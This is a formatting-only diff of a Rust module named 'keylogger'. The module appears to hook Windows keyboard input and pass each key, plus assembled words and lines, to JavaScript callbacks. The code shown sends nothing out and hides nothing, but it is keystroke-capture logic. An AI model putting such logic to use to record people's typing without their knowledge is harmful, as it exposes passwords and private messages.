@@ -143,7 +143,7 @@ pub mod keylogger {
       match Key::new(data) {
         Some(key) => {
           let _ = (*this).mutex.lock().unwrap();
-          
+
           if ((*data).dwCode as u16) == VK_BACK {
             if let Some(ref mut word) = (*this).word {
               if word.len() > 0 {
@@ -162,7 +162,7 @@ pub mod keylogger {
             Key::Special(_) => (*this).callbacks.contains_key(&ListenerKind::Key),
             Key::Char(c) => {
               let mut found = false;
-  
+
               if let Some(ref mut line) = (*this).line {
                 if line.len() > 0 && c == '\n' {
                   found = true;
@@ -180,11 +180,11 @@ pub mod keylogger {
                   word.push(c);
                 }
               }
-  
+
               found || (*this).callbacks.contains_key(&ListenerKind::Char)
             }
           }
-        },
+        }
         None => false,
       }
     }
@@ -195,7 +195,12 @@ pub mod keylogger {
 
       match k {
         Key::Special(s) => {
-          for cb in (*this).callbacks.get(&ListenerKind::Key).unwrap_unchecked().iter() {
+          for cb in (*this)
+            .callbacks
+            .get(&ListenerKind::Key)
+            .unwrap_unchecked()
+            .iter()
+          {
             cb.call(JsKey::Special(s), ThreadsafeFunctionCallMode::Blocking);
           }
         }
@@ -206,8 +211,11 @@ pub mod keylogger {
           if c == '\n' {
             if let Some(ref mut line) = (*this).line {
               if line.len() > 0 {
-                for cb in
-                  (*this).callbacks.get(&ListenerKind::Line).unwrap_unchecked().iter()
+                for cb in (*this)
+                  .callbacks
+                  .get(&ListenerKind::Line)
+                  .unwrap_unchecked()
+                  .iter()
                 {
                   cb.call(
                     JsKey::Text(line.clone()),
@@ -223,8 +231,11 @@ pub mod keylogger {
           if c.is_whitespace() {
             if let Some(ref mut word) = (*this).word {
               if word.len() > 0 {
-                for cb in
-                 (*this).callbacks.get(&ListenerKind::Word).unwrap_unchecked().iter()
+                for cb in (*this)
+                  .callbacks
+                  .get(&ListenerKind::Word)
+                  .unwrap_unchecked()
+                  .iter()
                 {
                   cb.call(
                     JsKey::Text(word.clone()),
